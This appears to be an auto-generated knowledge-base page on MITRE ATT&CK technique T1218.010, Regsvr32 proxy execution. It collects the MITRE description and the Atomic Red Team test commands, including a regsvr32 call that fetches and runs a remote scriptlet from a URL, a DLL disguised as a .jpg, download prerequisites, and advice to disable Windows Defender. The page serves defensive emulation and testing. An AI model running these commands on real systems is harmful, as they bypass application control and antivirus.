
# Regsvr32

## Description

### MITRE Description

> Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. (Citation: Microsoft Regsvr32)

Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)

## Aliases

```

```

## Additional Attributes

* Bypass: ['Digital Certificate Validation', 'Anti-virus', 'Application control']
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator', 'User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1218/010

## Potential Commands

```
IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll) ELSE ( regsvr32.exe /s PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll )
regsvr32 /s %temp%\shell32.jpg
regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
regsvr32.exe /s /u /i:PathToAtomicsFolder\T1218.010\src\RegSvr32.sct scrobj.dll
```

## Commands Dataset

```
[{'command': 'regsvr32.exe /s /u '
             '/i:PathToAtomicsFolder\\T1218.010\\src\\RegSvr32.sct '
             'scrobj.dll\n',
  'name': None,
  'source': 'atomics/T1218.010/T1218.010.yaml'},
 {'command': 'regsvr32.exe /s /u '
             '/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct '
             'scrobj.dll\n',
  'name': None,
  'source': 'atomics/T1218.010/T1218.010.yaml'},
 {'command': 'IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" '
             '(C:\\Windows\\syswow64\\regsvr32.exe /s '
             'PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll) ELSE ( '
             'regsvr32.exe /s '
             'PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll )\n',
  'name': None,
  'source': 'atomics/T1218.010/T1218.010.yaml'},
 {'command': 'regsvr32 /s %temp%\\shell32.jpg\n',
  'name': None,
  'source': 'atomics/T1218.010/T1218.010.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Signed Binary Proxy Execution: Regsvr32': {'atomic_tests': [{'auto_generated_guid': '449aa403-6aba-47ce-8a37-247d21ef0306',
                                                                                       'dependencies': [{'description': 'Regsvr32.sct '
                                                                                                                        'must '
                                                                                                                        'exist '
                                                                                                                        'on '
                                                                                                                        'disk '
                                                                                                                        'at '
                                                                                                                        'specified '
                                                                                                                        'location '
                                                                                                                        '(#{filename})\n',
                                                                                                         'get_prereq_command': 'New-Item '
                                                                                                                               '-Type '
                                                                                                                               'Directory '
                                                                                                                               '(split-path '
                                                                                                                               '#{filename}) '
                                                                                                                               '-ErrorAction '
                                                                                                                               'ignore '
                                                                                                                               '| '
                                                                                                                               'Out-Null\n'
                                                                                                                               'Invoke-WebRequest '
                                                                                                                               '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct" '
                                                                                                                               '-OutFile '
                                                                                                                               '"#{filename}"\n',
                                                                                                         'prereq_command': 'if '
                                                                                                                           '(Test-Path '
                                                                                                                           '#{filename}) '
                                                                                                                           '{exit '
                                                                                                                           '0} '
                                                                                                                           'else '
                                                                                                                           '{exit '
                                                                                                                           '1}\n'}],
                                                                                       'dependency_executor_name': 'powershell',
                                                                                       'description': 'Regsvr32.exe '
                                                                                                      'is '
                                                                                                      'a '
                                                                                                      'command-line '
                                                                                                      'program '
                                                                                                      'used '
                                                                                                      'to '
                                                                                                      'register '
                                                                                                      'and '
                                                                                                      'unregister '
                                                                                                      'OLE '
                                                                                                      'controls. '
                                                                                                      'Upon '
                                                                                                      'execution, '
                                                                                                      'calc.exe '
                                                                                                      'will '
                                                                                                      'be '
                                                                                                      'launched.\n',
                                                                                       'executor': {'command': 'regsvr32.exe '
                                                                                                               '/s '
                                                                                                               '/u '
                                                                                                               '/i:#{filename} '
                                                                                                               'scrobj.dll\n',
                                                                                                    'name': 'command_prompt'},
                                                                                       'input_arguments': {'filename': {'default': 'PathToAtomicsFolder\\T1218.010\\src\\RegSvr32.sct',
                                                                                                                        'description': 'Name '
                                                                                                                                       'of '
                                                                                                                                       'the '
                                                                                                                                       'local '
                                                                                                                                       'file, '
                                                                                                                                       'include '
                                                                                                                                       'path.',
                                                                                                                        'type': 'Path'}},
                                                                                       'name': 'Regsvr32 '
                                                                                               'local '
                                                                                               'COM '
                                                                                               'scriptlet '
                                                                                               'execution',
                                                                                       'supported_platforms': ['windows']},
                                                                                      {'auto_generated_guid': 'c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36',
                                                                                       'description': 'Regsvr32.exe '
                                                                                                      'is '
                                                                                                      'a '
                                                                                                      'command-line '
                                                                                                      'program '
                                                                                                      'used '
                                                                                                      'to '
                                                                                                      'register '
                                                                                                      'and '
                                                                                                      'unregister '
                                                                                                      'OLE '
                                                                                                      'controls. '
                                                                                                      'This '
                                                                                                      'test '
                                                                                                      'may '
                                                                                                      'be '
                                                                                                      'blocked '
                                                                                                      'by '
                                                                                                      'windows '
                                                                                                      'defender; '
                                                                                                      'disable\n'
                                                                                                      'windows '
                                                                                                      'defender '
                                                                                                      'real-time '
                                                                                                      'protection '
                                                                                                      'to '
                                                                                                      'fix '
                                                                                                      'it. '
                                                                                                      'Upon '
                                                                                                      'execution, '
                                                                                                      'calc.exe '
                                                                                                      'will '
                                                                                                      'be '
                                                                                                      'launched.\n',
                                                                                       'executor': {'command': 'regsvr32.exe '
                                                                                                               '/s '
                                                                                                               '/u '
                                                                                                               '/i:#{url} '
                                                                                                               'scrobj.dll\n',
                                                                                                    'name': 'command_prompt'},
                                                                                       'input_arguments': {'url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct',
                                                                                                                   'description': 'URL '
                                                                                                                                  'to '
                                                                                                                                  'hosted '
                                                                                                                                  'sct '
                                                                                                                                  'file',
                                                                                                                   'type': 'Url'}},
                                                                                       'name': 'Regsvr32 '
                                                                                               'remote '
                                                                                               'COM '
                                                                                               'scriptlet '
                                                                                               'execution',
                                                                                       'supported_platforms': ['windows']},
                                                                                      {'auto_generated_guid': '08ffca73-9a3d-471a-aeb0-68b4aa3ab37b',
                                                                                       'dependencies': [{'description': 'AllTheThingsx86.dll '
                                                                                                                        'must '
                                                                                                                        'exist '
                                                                                                                        'on '
                                                                                                                        'disk '
                                                                                                                        'at '
                                                                                                                        'specified '
                                                                                                                        'location '
                                                                                                                        '(#{dll_name})\n',
                                                                                                         'get_prereq_command': 'New-Item '
                                                                                                                               '-Type '
                                                                                                                               'Directory '
                                                                                                                               '(split-path '
                                                                                                                               '#{dll_name}) '
                                                                                                                               '-ErrorAction '
                                                                                                                               'ignore '
                                                                                                                               '| '
                                                                                                                               'Out-Null\n'
                                                                                                                               'Invoke-WebRequest '
                                                                                                                               '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" '
                                                                                                                               '-OutFile '
                                                                                                                               '"#{dll_name}"\n',
                                                                                                         'prereq_command': 'if '
                                                                                                                           '(Test-Path '
                                                                                                                           '#{dll_name}) '
                                                                                                                           '{exit '
                                                                                                                           '0} '
                                                                                                                           'else '
                                                                                                                           '{exit '
                                                                                                                           '1}\n'}],
                                                                                       'dependency_executor_name': 'powershell',
                                                                                       'description': 'Regsvr32.exe '
                                                                                                      'is '
                                                                                                      'a '
                                                                                                      'command-line '
                                                                                                      'program '
                                                                                                      'used '
                                                                                                      'to '
                                                                                                      'register '
                                                                                                      'and '
                                                                                                      'unregister '
                                                                                                      'OLE '
                                                                                                      'controls. '
                                                                                                      'Upon '
                                                                                                      'execution, '
                                                                                                      'calc.exe '
                                                                                                      'will '
                                                                                                      'be '
                                                                                                      'launched.\n',
                                                                                       'executor': {'command': 'IF '
                                                                                                               '"%PROCESSOR_ARCHITECTURE%"=="AMD64" '
                                                                                                               '(C:\\Windows\\syswow64\\regsvr32.exe '
                                                                                                               '/s '
                                                                                                               '#{dll_name}) '
                                                                                                               'ELSE '
                                                                                                               '( '
                                                                                                               'regsvr32.exe '
                                                                                                               '/s '
                                                                                                               '#{dll_name} '
                                                                                                               ')\n',
                                                                                                    'name': 'command_prompt'},
                                                                                       'input_arguments': {'dll_name': {'default': 'PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll',
                                                                                                                        'description': 'Name '
                                                                                                                                       'of '
                                                                                                                                       'DLL '
                                                                                                                                       'to '
                                                                                                                                       'Execute, '
                                                                                                                                       'DLL '
                                                                                                                                       'Should '
                                                                                                                                       'export '
                                                                                                                                       'DllRegisterServer',
                                                                                                                        'type': 'Path'}},
                                                                                       'name': 'Regsvr32 '
                                                                                               'local '
                                                                                               'DLL '
                                                                                               'execution',
                                                                                       'supported_platforms': ['windows']},
                                                                                      {'auto_generated_guid': '1ae5ea1f-0a4e-4e54-b2f5-4ac328a7f421',
                                                                                       'dependencies': [{'description': 'Test '
                                                                                                                        'requires '
                                                                                                                        'a '
                                                                                                                        'renamed '
                                                                                                                        'dll '
                                                                                                                        'file\n',
                                                                                                         'get_prereq_command': 'copy '
                                                                                                                               '"C:\\Windows\\System32\\shell32.dll" '
                                                                                                                               '"#{dll_file}"\n',
                                                                                                         'prereq_command': 'if '
                                                                                                                           'exist '
                                                                                                                           '#{dll_file} '
                                                                                                                           '( '
                                                                                                                           'exit '
                                                                                                                           '0 '
                                                                                                                           ') '
                                                                                                                           'else '
                                                                                                                           '( '
                                                                                                                           'exit '
                                                                                                                           '1 '
                                                                                                                           ')\n'}],
                                                                                       'dependency_executor_name': 'command_prompt',
                                                                                       'description': 'Replicating '
                                                                                                      'observed '
                                                                                                      'Gozi '
                                                                                                      'maldoc '
                                                                                                      'behavior '
                                                                                                      'registering '
                                                                                                      'a '
                                                                                                      'dll '
                                                                                                      'with '
                                                                                                      'an '
                                                                                                      'altered '
                                                                                                      'extension\n',
                                                                                       'executor': {'cleanup_command': 'regsvr32 '
                                                                                                                       '/U '
                                                                                                                       '/s '
                                                                                                                       '#{dll_file}\n',
                                                                                                    'command': 'regsvr32 '
                                                                                                               '/s '
                                                                                                               '#{dll_file}\n',
                                                                                                    'elevation_required': False,
                                                                                                    'name': 'command_prompt'},
                                                                                       'input_arguments': {'dll_file': {'default': '%temp%\\shell32.jpg',
                                                                                                                        'description': 'Path '
                                                                                                                                       'to '
                                                                                                                                       'renamed '
                                                                                                                                       'dll '
                                                                                                                                       'file '
                                                                                                                                       'to '
                                                                                                                                       'be '
                                                                                                                                       'registered',
                                                                                                                        'type': 'Path'}},
                                                                                       'name': 'Regsvr32 '
                                                                                               'Registering '
                                                                                               'Non '
                                                                                               'DLL',
                                                                                       'supported_platforms': ['windows']}],
                                                                     'attack_technique': 'T1218.010',
                                                                     'display_name': 'Signed '
                                                                                     'Binary '
                                                                                     'Proxy '
                                                                                     'Execution: '
                                                                                     'Regsvr32'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations


* [Exploit Protection](../mitigations/Exploit-Protection.md)


# Actors


* [Deep Panda](../actors/Deep-Panda.md)

* [APT32](../actors/APT32.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [APT19](../actors/APT19.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [WIRTE](../actors/WIRTE.md)
    
* [Inception](../actors/Inception.md)
    
* [Blue Mockingbird](../actors/Blue-Mockingbird.md)
    
